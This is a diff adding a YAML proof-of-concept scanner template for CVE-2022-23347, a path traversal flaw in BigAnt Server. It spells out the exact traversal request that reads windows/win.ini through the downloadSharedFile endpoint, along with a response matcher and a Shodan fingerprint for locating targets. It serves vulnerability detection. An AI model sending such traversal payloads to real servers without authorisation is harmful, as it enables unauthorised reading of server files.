@@ -1,0 +1,16 @@
+id: poc-yaml-bigant-server-downloadsharedfile-path-traversal
+info:
+  name: BigAnt Server downloadSharedFile 路径遍历漏洞(CVE-2022-23347)
+  severity: medium
+  tags:
+  - CVE-2022-23347
+  - 路径遍历
+  finger: bigant_server
+  shodan: http.html:"bigant"
+requests:
+- method: GET
+  path: /index.php/Pan/ShareUrl/downloadSharedFile?true_path=../../../../../../windows/win.ini&file_name=win.ini
+  expression: status_code == 200 && contains(body,"; for 16-bit app support") && contains(body,"[files]")
+    && !contains(body,"<")
+variables: {}
+transport: http
